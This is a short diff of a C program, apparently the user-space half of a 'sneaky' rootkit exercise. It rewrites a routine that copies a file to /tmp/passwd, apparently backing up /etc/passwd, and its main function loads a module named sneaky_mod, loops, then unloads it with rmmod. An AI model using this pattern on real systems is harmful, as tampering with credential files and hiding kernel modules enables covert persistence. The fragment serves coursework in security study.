@@ -13,34 +13,20 @@ void mycopy(){
     const char *fileWrite = "/tmp/passwd";
 
     //首先打开一个文件
-    int file=open(fileRead,O_RDWR|O_CREAT);
-    
-    if(file==-1){//校验是否成功的打开了文件
-        perror("read");//打开失败输出信息
-        exit(1);//失败退出当前的程序
-    } 
+    FILE* file=fopen(fileRead,"r");
+
     //创建一个写入的文件
-    int new_file=open(fileWrite,O_RDWR|O_CREAT);//设置权限为777的love的txt文件
+    FILE* new_file=fopen(fileWrite,"w+");//
     
-    if(new_file==-1){//校验是否成功的创建了该文件 
-        perror("write");//打开失败输出信息
-        exit(1);//失败退出当前的程序
-    } 
     //创建一个缓冲，初始化为一
-    int buff[1024]={0};
-    int count=0;//初始化计数器
-    count=read(file,buff,1024);//将读到的字节数组保存到缓冲数组中
-    if(count==-1){
-        perror("read");//文件中没有数据
-        exit(1);//退出程序
-    }
+    int buf[1024]={0};
+    int nread;
     
-    while(count){//当输出为0时读取完毕
-        write(new_file,buff,count);//将读取到的字节写入到文件中
-        count=read(file,buff,count);//继续进行读取
+    while(nread = fread(buf,sizeof(char),1024,file)){//当输出为0时读取完毕
+        fwrite(buf,sizeof(char),nread,new_file);
     }
-    close(file);//关闭文件
-    close(new_file);//关闭文件
+    fclose(file);//关闭文件
+    fclose(new_file);//关闭文件
 
 }
 
@@ -119,7 +105,7 @@ void qloop(){
             break;
         }
     }
-}
+} 
 
 void remove_module(){
     system("rmmod sneaky_mod");
@@ -135,7 +121,8 @@ int main(){
     //myprint_tmp();
     myinsert();
     //myprint_etc();
-
+ 
+    
     install_module();
     qloop();
     remove_module();
